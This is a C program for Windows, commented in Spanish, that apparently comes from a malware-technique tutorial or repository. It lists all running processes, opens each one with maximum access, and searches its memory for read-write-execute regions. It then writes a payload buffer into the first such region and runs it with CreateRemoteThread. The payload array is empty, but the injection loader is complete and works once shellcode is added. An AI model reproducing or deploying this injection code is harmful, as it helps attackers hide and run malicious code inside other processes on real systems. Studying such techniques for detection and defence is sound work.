#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

unsigned char my_payload[] = "";

int main(int argc, char* argv[])
{
	// Estructura para almacenar informaci�n sobre una regi�n de memoria
	MEMORY_BASIC_INFORMATION         m;
	// Estructura para almacenar informaci�n sobre un proceso
	PROCESSENTRY32			        pe;
	// Puntero a una direcci�n de memoria 
	LPVOID					   address;
	// Manejador de un proceso
	HANDLE						    ph;
	// Manejador de una instant�nea de proceso 
	HANDLE				     hSnapshot;
	// Almacenar el resultado de las llamadas a la API 
	BOOL					   hResult;
	pe.dwSize = sizeof(PROCESSENTRY32);

	// Crea una instant�nea de los procesos en ejecuci�n
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hSnapshot)
		return -1;
	
	// Obtiene la primera entrada de proceso de la instant�nea 
	hResult = Process32First(hSnapshot, &pe);

	while (hResult)
	{
		// Abre el proceso actual con el m�ximo acceso 
		ph = OpenProcess(MAXIMUM_ALLOWED, false, pe.th32ProcessID);
		if (ph)
		{
			// Imprime el nombre del proceso que se est� examinando
			printf("Hunting in %s \n", pe.szExeFile);
			// Consulta informaci�n sobre las regiones de memoria dentro del proceso
			while (VirtualQueryEx(ph, address, &m, sizeof(m)))
			{
				address = (LPVOID)((DWORD_PTR)m.BaseAddress + m.RegionSize);
				if (m.AllocationProtect == PAGE_EXECUTE_READWRITE)
				{
					printf("RWX memory  successfully found at 0x%x :) \n", m.BaseAddress);
					// Intentamos escribir en la regi�n de memoria RWX
					WriteProcessMemory(ph, m.BaseAddress, my_payload, sizeof(my_payload), NULL);
					// Crea un nuevo hilo dentro del proceso de destino que comienza la ejecuci�n
					// en la direcci�n en donde se escrib�� la carga �til
					CreateRemoteThread(ph, NULL, NULL, (LPTHREAD_START_ROUTINE)m.BaseAddress, NULL, NULL, NULL);
					break;
				}
			}
			address = 0;
		}
		//  El bucle itera a trav�s de todos los procesos en la instant�nea
		hResult = Process32Next(hSnapshot, &pe);
	}

	// Limpieza
	CloseHandle(hSnapshot);
	CloseHandle(ph);

	return 0;
}



